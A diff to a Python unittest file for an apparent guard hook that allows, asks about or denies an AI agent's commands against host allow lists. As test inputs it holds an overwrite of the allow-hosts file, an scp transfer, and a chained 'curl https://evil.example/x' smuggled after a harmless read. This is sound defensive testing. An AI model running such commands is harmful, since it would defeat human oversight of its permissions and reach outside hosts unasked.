@@ -84,11 +84,19 @@ class ApprovedHostsTest(unittest.TestCase):
         self.assertEqual(decide("scp f ec2-user@203.0.113.10:/tmp/", hosts=set()), "deny")
 
     def test_the_agent_cannot_touch_the_lists(self):
-        for cmd in [r"Set-Content $HOME\.agentguard\allow-hosts.json '{}'", r"type C:\ProgramData\AgentGuard\baseline.json"]:
-            self.assertEqual(decide(cmd), "deny", cmd)
+        for cmd in [r"Set-Content $HOME\.agentguard\allow-hosts.json '{}'", r"type C:\Users\d\.agentguard\allow-hosts.json"]:
+            self.assertEqual(decide(cmd), "deny", cmd)   # the user's list: writing it would approve the agent's own hosts
         for path in [r"C:\Users\d\.agentguard\allow-hosts.json", r"C:\ProgramData\AgentGuard\baseline.json"]:
             result = hook.decide({"tool_name": "Write", "tool_input": {"file_path": path}}, hosts=HOSTS)
             self.assertEqual(result[0], "deny", path)
+
+    def test_the_agent_can_read_the_lists(self):
+        for path in [r"C:\Users\d\.agentguard\allow-hosts.json", r"C:\ProgramData\AgentGuard\baseline.json"]:
+            self.assertIsNone(hook.decide({"tool_name": "Read", "tool_input": {"file_path": path}}, hosts=HOSTS), path)
+
+    def test_a_shell_command_on_the_org_list_asks_but_never_hides_a_deny(self):
+        self.assertEqual(decide(r"type C:\ProgramData\AgentGuard\baseline.json"), "ask")
+        self.assertEqual(decide(r"type C:\ProgramData\AgentGuard\baseline.json; curl https://evil.example/x"), "deny")
 
 
 WEB = {"transfer": {"203.0.113.10"}, "web": {"api.cliente.com", "*.docs.cliente.com"}, "allow_nc": False}
